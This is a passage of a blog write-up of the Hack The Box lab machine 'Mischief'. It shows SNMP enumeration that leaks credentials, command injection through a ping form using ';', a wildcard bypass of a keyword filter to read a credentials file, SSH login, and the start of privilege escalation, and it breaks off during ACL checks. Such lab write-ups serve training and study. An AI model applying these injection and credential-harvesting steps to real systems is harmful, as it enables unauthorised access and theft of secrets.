@@ -1,0 +1,894 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    
+    
+    <meta property="article:tag" content="hackthebox" />
+    
+    <meta property="article:tag" content="htb" />
+    
+    <meta property="article:tag" content="boot2root" />
+    
+    <meta property="article:tag" content="writeup" />
+    
+    <meta property="article:tag" content="write-up" />
+    
+    <meta property="article:tag" content="linux" />
+    
+    <meta property="article:tag" content="snmp" />
+    
+    <meta property="article:tag" content="ipv6" />
+    
+    <meta property="article:tag" content="command execution" />
+    
+    <meta property="article:tag" content="access control lists" />
+    
+    <meta property="article:tag" content="mischief" />
+        
+
+    <meta name="twitter:card" content="summary"/>
+    <meta name="twitter:title" content="HTB Mischief">
+    <meta name="twitter:description" content="10.10.10.92 | Tricked Badge">
+    <meta name="twitter:site" content="@jebidiah-anthony" />
+    <meta name="twitter:creator" content="@feeeellliix">
+
+    
+    <meta property="og:image" content="https://jebidiah-anthony.github.io/boxes/screenshots/15_mischief/mischief.png" />
+    
+
+    
+    <meta property="og:title" content="HTB Mischief" />
+    
+
+    <!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>HTB Mischief | jebidiah-anthony</title>
+<meta name="generator" content="Jekyll v4.0.0" />
+<meta property="og:title" content="HTB Mischief" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="10.10.10.92 Tricked Badge" />
+<meta property="og:description" content="10.10.10.92 Tricked Badge" />
+<link rel="canonical" href="https://jebidiah-anthony.github.io/boxes/15_Mischief.html" />
+<meta property="og:url" content="https://jebidiah-anthony.github.io/boxes/15_Mischief.html" />
+<meta property="og:site_name" content="jebidiah-anthony" />
+<script type="application/ld+json">
+{"description":"10.10.10.92 Tricked Badge","@type":"WebPage","headline":"HTB Mischief","url":"https://jebidiah-anthony.github.io/boxes/15_Mischief.html","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+    <style>
+      .user_host { color: green; }
+      .sys_dir { color: #779ECB; }
+      p { color:#aaa; }
+      header { margin-bottom: 0px; }
+      .header .navbtn {
+	position: fixed;
+	width: 0px;
+	visibility: hidden;
+      }
+      .header .title { 
+	padding-left: 69px;
+	vertical-align: middle;
+      }
+      .header .title h2 { margin: 0; } 
+
+      .container {
+	max-width: 1200px;
+      }
+      .sidebar {
+        border-right: 1px dashed #b5e853;
+	bottom: 0;
+        height: 100%;
+	overflow: auto;
+	padding: 10px 10px 10px 10px;
+        position: fixed;
+	top: 0;
+        width: 230px;
+      }
+      .openbtn { 
+	color:#b5e853;
+	font-size:30px;
+	cursor:pointer
+      }
+      .closebtn {
+	color:#b5e853;
+	font-size:69px;
+	cursor:pointer;
+	position:absolute;
+	top:0;
+	right:25px;
+	font-size:36px;
+	margin-left:50px;
+	visibility:hidden;
+      }
+      
+      .ctf_content {
+        margin-left: 250px;
+	padding-bottom: 5px;
+      }
+      .ctf_content h2 {	padding: 20px 0px 0px 10px; }
+      .ctf_content h3 { margin: 20px 0px 0px 10px; }
+      .ctf_content img {
+ 	display: block;
+	margin-left: auto;
+	margin-right: auto;
+	max-width: 100%;
+	padding: 0 10px 0 0;
+      }
+      .ctf_content table { padding: 0 15px; }
+
+      #main_content h1 { padding: 20px 0px 0px 8px; }
+      #main_content h2, p, pre { 
+	padding-right:10px;
+	padding-left:15px; 
+      }
+      #main_content h4 { 
+        margin: 20px 0px 10px 0px; 
+        padding-left: 25px; 
+      }
+      #main_content ol, ul { margin: 0 0 0 10px; }
+
+      .highlighter-rouge { padding: 0 10px 0 10px; }
+
+      .section-divider{
+        border-bottom: 1.5px solid #b5e853;
+        padding-top:28px;
+        width:55%;
+      }
+      
+      @media screen and (min-width: 801px) {
+	.ctf_content {
+          margin-left: 250px;
+	  padding-bottom: 5px;
+        }
+      }
+      @media screen and (max-width: 800px) {
+        header {
+	  background-color: #202020;
+	  height: 80px;
+	  padding: 0px 0 0 0;
+	  position: fixed;
+	  top: 0;
+	}
+        .header .navbtn {
+          height: 80px;
+	  padding: 18px 0 0 20px;
+          visibility: visible;
+	  width: 100px;
+        }
+	.header .title { padding-left: 100px; }
+	.header .title h1 { padding-top: 5px; }
+        .header .title h2 { margin: 0; }
+
+	.container {
+	  width:100%;
+	}
+	.sidebar {
+          width: 0;
+          z-index: 1;
+          overflow-x: hidden;
+	  padding: 0;
+          transition: 0.5s;
+	}
+	.sidebar h2 { 
+	  font-size: 18px; 
+	  padding: 10px 10px 5px 10px;
+	}
+	.sidebar div { 
+	  font-size: 15px; 
+	  padding: 5px 10px 5px 10px;
+	}
+	.closebtn { visibility:visible; }
+
+	.highlighter-rouge { padding: 0 0 0 0; }
+
+	.ctf_content {
+	  margin: 0;
+	}
+	.ctf_content h2 { padding: 15px 0px 0px 5px; }
+        .ctf_content h3 { margin: 15px 10px 0px 15px; }
+        .ctf_content img {
+	  max-width: 100%;
+	  padding: 0 10px 0 0;
+        }
+	.ctf_content table { 
+	  margin: 0 10px 0px -8px;
+	  min-width: 800px;
+	}
+
+        #main_content { margin-top:80px; }
+	#main_content code { font-size: 15px; }
+	#main_content h1 { font-size: 25px; }
+	#main_content h2 { font-size: 22px; }
+	#main_content h3 { font-size: 18px; }
+	#main_content h4 { padding-left: 20px; }
+	#main_content ol, ul {
+	  font-size: 14px;
+	  margin: 0 0 0 12px;
+	  padding: 0 0 0 25px;
+	}
+	#main_content table { font-size: 14px; }
+      }
+
+      @media screen and (max-width: 480px) {
+        header {
+	  background-color: #202020;
+	  height: 70px;
+	  padding: 0px 0 0 0;
+	  position: fixed;
+	  top: 0;
+	}
+        .header .navbtn {
+          height: 70px;
+	  padding: 14px 0 0 18px;
+        }
+	.header .title { padding-left: 100px; }
+	.header .title h1 { font-size:22px; }
+        .header .title h2 { font-size:16px; }
+
+	#main_content code { font-size: 13px; }
+        #main_content ol, ul {
+	  font-size: 13px;
+	  margin: 0 0 0 12px;
+	  padding: 0 0 0 25px;
+	}
+	#main_content table { font-size: 13px; }
+      }
+    </style>
+
+  </head>
+
+  <body>
+    <div class="container">
+       <div id="sidebar" class="sidebar">
+         <span class="closebtn" onclick="closeNav()">&times;</span>      
+	 <div><h2 style="margin-bottom:0; padding-top:20px">[SITE PAGES]</h2>
+
+<div style="padding-top:10px">
+  
+  > <a href="/">whoami</a>
+  
+</div>
+<div style="padding-top:10px">  
+  >  <a href="/htb.html">
+    
+    <strong style="color:orange">htb writeups</strong>
+    
+  </a>
+</div>
+<div style="padding-top:10px">
+  > <a href="/ctf.html">
+    
+    ctf writeups
+    
+  </a>
+</div>
+<div style="padding-top:10px">
+  > <a href="/projects.html">
+    
+    projects
+    
+  </a>
+</div>
+</div>
+	 <div style="padding-bottom:20px">
+           
+             <h2 style="margin-bottom:0; padding-top: 20px">[HTB BOXES]</h2>
+
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/62_Travel.html">Travel</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/61_Quick.html">Quick</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/49_Unbalanced.html">Unbalanced</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/38_Bitlab.html">Bitlab</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/33_Safe.html">Safe</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/32_Ellingson.html">Ellingson</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/31_WriteUp.html">WriteUp</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/30_swagshop.html">swagshop</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/29_kryptos.html">kryptos</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/28_Luke.html">Luke</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/26_CTF.html">CTF</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/25_Friendzone.html">Friendzone</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/24_Flujab.html">Flujab</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/23_Help.html">Help</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/22_Chaos.html">Chaos</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/21_Lightweight.html">Lightweight</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/20_Irked.html">Irked</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/19_Teacher.html">Teacher</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <strong style="color:orange">Mischief</strong>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/14_Waldo.html">Waldo</a>
+  
+</div>
+
+
+
+	   
+	 </div>
+       </div>
+       <div id="content" class="ctf_content">
+	 <header>
+           <div class="header">
+             <div class="navbtn">
+               <span class="openbtn" onclick="openNav()">&#9776;</span>
+	     </div>
+	     <div class="title">
+               <h1>jebidiah-anthony</h1>
+               <h2 style="padding:0 0 0 0">write-ups and what not</h2>
+	     </div>
+           </div>
+         </header>
+         <section id="main_content"><h1 id="htb-mischief-10101092-machine-write-up"><span style="color:red">HTB Mischief (10.10.10.92) MACHINE WRITE-UP</span></h1>
+
+<hr />
+
+<h3 id="table-of-contents">TABLE OF CONTENTS</h3>
+
+<ul>
+  <li><a href="#part-1--initial-recon">PART 1 : INITIAL RECON</a></li>
+  <li><a href="#part-2--port-enumeration">PART 2 : PORT ENUMERATION</a>
+    <ul>
+      <li><a href="#udp-port-161-snmp">UDP PORT 161 (snmp)</a></li>
+      <li><a href="#tcp-port-3366-http-ipv4">TCP PORT 3366 (http, IPv4)</a></li>
+      <li><a href="#tcp-port-80-http-ipv6">TCP PORT 80 (http, IPv6)</a></li>
+    </ul>
+  </li>
+  <li><a href="#part-3--exploitation">PART 3 : EXPLOITATION</a></li>
+  <li><a href="#part-4--generate-user-shell">PART 4 : GENERATE USER SHELL</a></li>
+  <li><a href="#part-51--privilege-escalation-loki---root">PART 5.1 : PRIVILEGE ESCALATION (loki -&gt; root)</a></li>
+  <li><a href="#part-52--privilege-escalation-www-data---root">PART 5.2 : PRIVILEGE ESCALATION (www-data -&gt; root)</a></li>
+</ul>
+
+<hr />
+
+<h2 id="part-1--initial-recon">PART 1 : INITIAL RECON</h2>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>nmap <span class="nt">--min-rate</span> 1000 <span class="nt">-p-</span> <span class="nt">-sT</span> <span class="nt">-sU</span> <span class="nt">-v</span> 10.10.10.92
+<span class="go">
+  22/tcp   open  ssh
+  3366/tcp open  creativepartnr
+  161/udp  open  snmp
+
+</span><span class="gp">$</span><span class="w"> </span>nmap <span class="nt">-oN</span> mischief <span class="nt">-p</span> 22,161,3366 <span class="nt">-sC</span> <span class="nt">-sT</span> <span class="nt">-sU</span> <span class="nt">-sV</span> <span class="nt">-v</span> 10.10.10.92
+<span class="go">
+</span><span class="gp">  22/tcp   open          ssh            OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux;</span><span class="w"> </span>protocol 2.0<span class="o">)</span>
+<span class="go">  | ssh-hostkey:
+  |   2048 2a:90:a6:b1:e6:33:85:07:15:b2:ee:a7:b9:46:77:52 (RSA)
+  |   256 d0:d7:00:7c:3b:b0:a6:32:b2:29:17:8d:69:a6:84:3f (ECDSA)
+  |_  256 3f:1c:77:93:5c:c0:6c:ea:26:f4:bb:6c:59:e9:7c:b0 (ED25519)
+  3366/tcp open          caldav         Radicale calendar and contacts server (Python BaseHTTPServer)
+  | http-auth:
+  | HTTP/1.0 401 Unauthorizedx0D
+  |_  Basic realm=Test
+  | http-methods:
+  |_  Supported Methods: GET HEAD
+  |_http-server-header: SimpleHTTP/0.6 Python/2.7.15rc1
+  |_http-title: Site doesn't have a title (text/html).
+</span><span class="gp">  161/udp  open          snmp           SNMPv1 server;</span><span class="w"> </span>net-snmp SNMPv3 server <span class="o">(</span>public<span class="o">)</span>
+<span class="go">  | snmp-info:
+  |   enterprise: net-snmp
+  |   engineIDFormat: unknown
+  |   engineIDData: b6a9f84e18fef95a00000000
+  |   snmpEngineBoots: 19
+  |_  snmpEngineTime: 59m39s
+  | snmp-interfaces:
+  |   lo
+  |     IP address: 127.0.0.1  Netmask: 255.0.0.0
+  |     Type: softwareLoopback  Speed: 10 Mbps
+  |     Status: up
+  |     Traffic stats: 0.67 Kb sent, 0.67 Kb received
+  |   Intel Corporation 82545EM Gigabit Ethernet Controller (Copper)
+  |     IP address: 10.10.10.92  Netmask: 255.255.255.0
+  |     MAC address: 00:50:56:b9:2c:07 (VMware)
+  |     Type: ethernetCsmacd  Speed: 1 Gbps
+  |     Status: up
+  |_    Traffic stats: 618.08 Kb sent, 23.39 Mb received
+  | snmp-netstat:
+  |   TCP  0.0.0.0:22           0.0.0.0:0
+  |   TCP  0.0.0.0:3366         0.0.0.0:0
+  |   TCP  10.10.10.92:22       10.10.14.213:32850
+  |   TCP  10.10.10.92:22       10.10.14.213:32864
+  |   TCP  10.10.10.92:22       10.10.15.54:40920
+  |   TCP  10.10.10.92:22       10.10.16.63:40704
+  |   TCP  10.10.10.92:3366     10.10.14.213:47812
+  |   TCP  10.10.10.92:3366     10.10.14.213:47814
+  |   TCP  10.10.10.92:3366     10.10.14.213:47816
+  |   TCP  10.10.10.92:3366     10.10.14.213:47818
+  |   TCP  10.10.10.92:3366     10.10.14.213:47820
+  |   TCP  127.0.0.1:3306       0.0.0.0:0
+  |   TCP  127.0.0.53:53        0.0.0.0:0
+  |   UDP  0.0.0.0:161          *:*
+  |   UDP  0.0.0.0:34424        *:*
+  |_  UDP  127.0.0.53:53        *:*
+</span><span class="gp">  | snmp-sysdescr: Linux Mischief 4.15.0-20-generic #</span>21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_64
+<span class="go">  |_  System uptime: 59m39.09s (357909 timeticks)
+  |_snmp-win32-software:
+</span><span class="gp">  Service Info: Host: Mischief;</span><span class="w"> </span>OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+<span class="go">
+</span></code></pre></div></div>
+<p><strong>NOTE(S)</strong>:</p>
+<ul>
+  <li>An SNMP service is running at <strong>UDP PORT 161</strong>.</li>
+  <li>The web service running on <strong>TCP PORT 3366</strong> is served using a <strong>Python BaseHTTPServer</strong>.</li>
+</ul>
+
+<hr />
+
+<h2 id="part-2--port-enumeration">PART 2 : PORT ENUMERATION</h2>
+
+<h3 id="udp-port-161-snmp">UDP PORT 161 (snmp)</h3>
+
+<ul>
+  <li><strong><code class="highlighter-rouge">snmpwalk</code></strong>:
+    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>snmpwalk <span class="nt">-c</span> public 10.10.10.92 <span class="nt">-v</span> 2c
+<span class="go">
+</span><span class="gp">  iso.3.6.1.2.1.1.1.0 = STRING: "Linux Mischief 4.15.0-20-generic #</span>21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_64<span class="s2">"
+</span><span class="go">  iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
+  iso.3.6.1.2.1.1.3.0 = Timeticks: (4642890) 12:53:48.90
+  iso.3.6.1.2.1.1.4.0 = STRING: "Me "
+  iso.3.6.1.2.1.1.5.0 = STRING: "Mischief"
+  iso.3.6.1.2.1.1.6.0 = STRING: "Sitting on the Dock of the Bay"
+  ...omitted...
+
+</span></code></pre></div>    </div>
+    <p><strong>NOTE(S)</strong>:</p>
+    <ul>
+      <li>Processes (<strong><code class="highlighter-rouge">hrSWRunEntry</code></strong>):
+        <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">  iso.3.6.1.2.1.25.4.2.1.4.608 = STRING: "python"
+  ...omitted...
+  iso.3.6.1.2.1.25.4.2.1.5.608 = STRING: "-m SimpleHTTPAuthServer 3366 loki:godofmischiefisloki --dir /home/loki/hosted/"
+  ...omitted...
+</span></code></pre></div>        </div>
+        <ul>
+          <li>The process for the hosted webservice is found.</li>
+          <li>HTTP Authentication credentials are found - <strong><code class="highlighter-rouge">loki : godofmischiefisloki</code></strong></li>
+          <li>The web service is hosted from <strong><code class="highlighter-rouge">/home/loki/hosted</code></strong></li>
+        </ul>
+      </li>
+      <li>IPv6 Addresses (<strong><code class="highlighter-rouge">ipAddressIfIndex</code></strong>):
+        <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>snmpwalk <span class="nt">-c</span> public <span class="nt">-v</span> 2c 10.10.10.92 iso.3.6.1.2.1.4.34.1.3.2.16
+<span class="go">
+  iso.3.6.1.2.1.4.34.1.3.2.16.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.1 = INTEGER: 1
+  iso.3.6.1.2.1.4.34.1.3.2.16.222.173.190.239.0.0.0.0.2.80.86.255.254.185.245.54 = INTEGER: 2
+  iso.3.6.1.2.1.4.34.1.3.2.16.254.128.0.0.0.0.0.0.2.80.86.255.254.185.245.54 = INTEGER: 2
+
+</span></code></pre></div>        </div>
+        <ul>
+          <li>The 1st one is the <strong>Loopback Address</strong>.</li>
+          <li>The 2ns one is the <strong>Unique-Local Address</strong>.</li>
+          <li>The 3rd one is the <strong>Link Local Address</strong>.</li>
+        </ul>
+      </li>
+      <li>Evaluate the <strong><code class="highlighter-rouge">IPv6</code></strong> address of the system:
+        <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">unique_local_oid</span><span class="o">=</span><span class="si">$(</span>snmpwalk <span class="nt">-c</span> public <span class="nt">-v</span> 2c 10.10.10.92 iso.3.6.1.2.1.4.34.1.3.2.16.222 | <span class="nb">sed</span> <span class="nt">-ne</span> <span class="s1">'s/^.*\(222.*\) =.*$/\1/p'</span><span class="si">)</span>
+
+<span class="nv">unique_local_dec</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="nv">$unique_local_oid</span> | <span class="nb">tr</span> <span class="s1">'.'</span> <span class="s1">' '</span><span class="si">)</span>
+
+<span class="nv">unique_local_hex</span><span class="o">=</span><span class="si">$(</span><span class="nb">printf</span> <span class="s1">'%02x'</span> <span class="nv">$unique_local_dec</span><span class="si">)</span>
+ 
+<span class="nv">ipv6</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="nt">-n</span> <span class="nv">$unique_local_hex</span> | <span class="nb">fold</span> <span class="nt">-w4</span> | <span class="nb">tr</span> <span class="s1">'\n'</span> <span class="s1">':'</span><span class="si">)</span>
+</code></pre></div>        </div>
+        <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nb">echo</span> <span class="nv">$ipv6</span>
+<span class="go">
+  dead:beef:0000:0000:0250:56ff:fea4:29f2
+
+</span></code></pre></div>        </div>
+      </li>
+      <li>See if there are other ports open for <strong>IPv6</strong>:
+        <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>nmap <span class="nt">-6</span> <span class="nt">--min-rate</span> 1000 <span class="nt">-p-</span> <span class="nt">-v</span> dead:beef:0000:0000:0250:56ff:fea4:29f2
+<span class="go">      
+  22/tcp   open     ssh
+  80/tcp   open     http
+
+</span><span class="gp">$</span><span class="w"> </span>nmap <span class="nt">-6</span> <span class="nt">-p22</span>,80 <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-v</span> <span class="nv">$ipv6</span>
+<span class="go">
+</span><span class="gp">  22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux;</span><span class="w"> </span>protocol 2.0<span class="o">)</span>
+<span class="go">  | ssh-hostkey:
+  |   2048 2a:90:a6:b1:e6:33:85:07:15:b2:ee:a7:b9:46:77:52 (RSA)
+  |   256 d0:d7:00:7c:3b:b0:a6:32:b2:29:17:8d:69:a6:84:3f (ECDSA)
+  |_  256 3f:1c:77:93:5c:c0:6c:ea:26:f4:bb:6c:59:e9:7c:b0 (ED25519)
+  80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+  |_http-server-header: Apache/2.4.29 (Ubuntu)
+  |_http-title: 400 Bad Request
+</span><span class="gp">  Service Info: OS: Linux;</span><span class="w"> </span>CPE: cpe:/o:linux:linux_kernel
+<span class="go">
+</span></code></pre></div>        </div>
+        <ul>
+          <li>There is another <strong>http service</strong> open using <strong>IPv6</strong>.</li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+</ul>
+
+<h3 id="tcp-port-3366-http-ipv4">TCP PORT 3366 (http, IPv4)</h3>
+
+<ul>
+  <li>
+    <p><strong><code class="highlighter-rouge">http://10.10.10.136</code></strong>:</p>
+
+    <p><img src="./screenshots/15_mischief/3366_basic_auth.png" alt="3366 Basic Auth" /></p>
+
+    <p><strong>NOTE(S)</strong>:</p>
+    <ul>
+      <li>The credentials were found during the SNMP enumeration.</li>
+    </ul>
+  </li>
+  <li>
+    <p>Logging in using <strong><code class="highlighter-rouge">loki : godofmischiefisloki</code></strong>:</p>
+
+    <p><img src="./screenshots/15_mischief/3366_authenticated.png" alt="3366 Authenticated" /></p>
+
+    <p><strong>NOTE(S)</strong>:</p>
+    <ul>
+      <li>
+        <p>Two sets of credentials are found:</p>
+
+        <table>
+          <thead>
+            <tr>
+              <th>Username</th>
+              <th>Password</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td>loki</td>
+              <td>godofmischiefisloki</td>
+            </tr>
+            <tr>
+              <td>loki</td>
+              <td>trickeryanddeceit</td>
+            </tr>
+          </tbody>
+        </table>
+      </li>
+    </ul>
+  </li>
+</ul>
+
+<h3 id="tcp-port-80-http-ipv6">TCP PORT 80 (http, IPv6)</h3>
+
+<ul>
+  <li>
+    <p><strong><code class="highlighter-rouge">http://[dead:beef:0000:0000:0250:56ff:fea4:29f2]/</code></strong></p>
+
+    <p><img src="./screenshots/15_mischief/80_landing_page.png" alt="80 Landing Page" /></p>
+  </li>
+  <li>
+    <p>Attempt Logging in using the credentials found on <strong>PORT 3366</strong></p>
+
+    <p><img src="./screenshots/15_mischief/80_command_execution.png" alt="80 Command Execution" /></p>
+
+    <p><strong>NOTE(S)</strong>:</p>
+    <ul>
+      <li>The credential pair, <strong><code class="highlighter-rouge">administrator : trickeryanddeceit</code></strong>, worked.</li>
+      <li>So far, only the <strong><code class="highlighter-rouge">ping</code></strong> command could be executed.</li>
+      <li><strong><code class="highlighter-rouge">In my home directory, i have my password in a file called credentials, Mr Admin</code></strong></li>
+    </ul>
+  </li>
+</ul>
+
+<hr />
+
+<h3 id="part-3--exploitation">PART 3 : EXPLOITATION</h3>
+
+<ul>
+  <li>Bypass the command execution in the service running on <strong>port 80</strong>:
+    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>ping <span class="nt">-c</span> 2 127.0.0.1<span class="p">;</span> <span class="nb">id</span>
+<span class="go">    
+  PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+  64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.020 ms
+  64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.061 ms
+
+  --- 127.0.0.1 ping statistics ---
+  2 packets transmitted, 2 received, 0% packet loss, time 1028ms
+  rtt min/avg/max/mdev = 0.020/0.040/0.061/0.021 ms
+  Command was executed succesfully!
+
+</span><span class="gp">$</span><span class="w"> </span><span class="nb">id</span><span class="p">;</span> ping <span class="nt">-c</span> 2 127.0.0.1
+<span class="go">    
+  uid=33(www-data) gid=33(www-data) groups=33(www-data)
+  Command was executed succesfully!
+
+</span></code></pre></div>    </div>
+    <p><strong>NOTE(S)</strong>:</p>
+    <ul>
+      <li>The command execution could be bypassed by using a <strong><code class="highlighter-rouge">;</code></strong>.</li>
+      <li>The first command is the only one being executed</li>
+    </ul>
+  </li>
+</ul>
+
+<hr />
+
+<h2 id="part-4--generate-user-shell">PART 4 : GENERATE USER SHELL</h2>
+
+<ul>
+  <li>Take the file called <strong><code class="highlighter-rouge">credentials</code></strong> from the <strong><code class="highlighter-rouge">home directory</code></strong>:
+    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nb">echo</span> /home/<span class="k">*</span><span class="p">;</span> ping <span class="nt">-c</span> 2 127.0.0.1
+<span class="go">
+  /home/loki
+  Command was executed succesfully!
+
+</span><span class="gp">$</span><span class="w"> </span><span class="nb">echo</span> /home/loki/<span class="k">*</span><span class="p">;</span> ping <span class="nt">-c</span> 2 127.0.0.1
+<span class="go"> 
+  /home/loki/credentials /home/loki/hosted /home/loki/user.txt
+  Command was executed succesfully!
+
+</span><span class="gp">$</span><span class="w"> </span><span class="nb">cat</span> /home/loki/credentials<span class="p">;</span> ping <span class="nt">-c</span> 2 127.0.0.1
+<span class="go">
+  Command is not allowed.
+
+</span><span class="gp">$</span><span class="w"> </span><span class="nb">cat</span> /home/loki/cred<span class="k">*</span><span class="p">;</span> ping <span class="nt">-c</span> 2 127.0.0.1
+<span class="go">
+  pass: lokiisthebestnorsegod
+  Command was executed succesfully!
+
+</span></code></pre></div>    </div>
+    <p><strong>NOTE(S)</strong>:</p>
+    <ul>
+      <li>The word <strong><code class="highlighter-rouge">credentials</code></strong> is being filtered out by the service.</li>
+      <li>It was bypassed by using a <strong>wildcard</strong>.</li>
+    </ul>
+  </li>
+  <li>Login via <strong><code class="highlighter-rouge">ssh</code></strong>:
+    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>ssh <span class="nt">-l</span> loki 10.10.10.92
+<span class="go">  The authenticity of host '10.10.10.92 (10.10.10.92)' can't be established.
+  ECDSA key fingerprint is SHA256:deaxXTK7ORthfGcKdblPRUmgNrU20oclqMbwVj3hzYI.
+  Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+  Warning: Permanently added '10.10.10.92' (ECDSA) to the list of known hosts.
+</span><span class="gp">$</span><span class="w"> </span>loki@10.10.10.92<span class="s1">'s password: lokiisthebestnorsegod
+</span><span class="go">  
+</span><span class="gp">$</span><span class="w"> </span><span class="nb">cat </span>user.txt
+<span class="go">
+  bf58........................0060
+
+</span></code></pre></div>    </div>
+  </li>
+</ul>
+
+<hr />
+
+<h2 id="part-51--privilege-escalation-loki---root">PART 5.1 : PRIVILEGE ESCALATION (loki -&gt; root)</h2>
+
+<ul>
+  <li>Check for interesting files in <strong><code class="highlighter-rouge">loki</code></strong>’s home directory:
+    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-lah</span> ~
+<span class="go">    
+  -rw------- 1 loki loki  192 Jul 14  2018 .bash_history
+  ...omitted...
+  -rw-rw-r-- 1 loki loki   28 May 17  2018 credentials
+  ...omitted...
+  -rw-r--r-- 1 loki loki    0 May 14  2018 .sudo_as_admin_successful
+  -r-------- 1 loki loki   33 May 17  2018 user.txt
+  ...omitted...
+
+</span><span class="gp">$</span><span class="w"> </span><span class="nb">cat</span> .bash_history
+<span class="go">   
+  python -m SimpleHTTPAuthServer loki:lokipasswordmischieftrickery
+  ...omitted...
+  sudo su
+  su
+  exit
+  su root
+  ...omitted...
+  exit
+
+</span></code></pre></div>    </div>
+    <p><strong>NOTE(S)</strong>:</p>
+    <ul>
+      <li>There was an attempt to execute <strong><code class="highlighter-rouge">su root</code></strong> in the <strong><code class="highlighter-rouge">.bash_history</code></strong>.</li>
+      <li>There is a <strong><code class="highlighter-rouge">.sudo_as_admin_successful</code></strong> which might mean the attempt was successful.</li>
+      <li>A previously unknown credential pair was used to initialize the python <strong><code class="highlighter-rouge">simpleHTTPAuthServer</code></strong>.
+        <ul>
+          <li>This might be a lead for the <strong>root password</strong>.</li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+  <li>Attempt to execute <strong><code class="highlighter-rouge">su root</code></strong>:
+    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>su root
+<span class="go"> 
+  -bash: /bin/su: Permission denied
+
+</span></code></pre></div>    </div>
+  </li>
+  <li>Check privileges for the <strong><code class="highlighter-rouge">su</code></strong> command:
+    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>getfacl <span class="nt">-R</span> <span class="nt">-s</span> / 2&gt;/dev/null | <span class="nb">grep</span> <span class="nt">-A</span> 9 su
+<span class="go">    
+</span><span class="gp">  #</span><span class="w"> </span>file: usr/bin/sudo
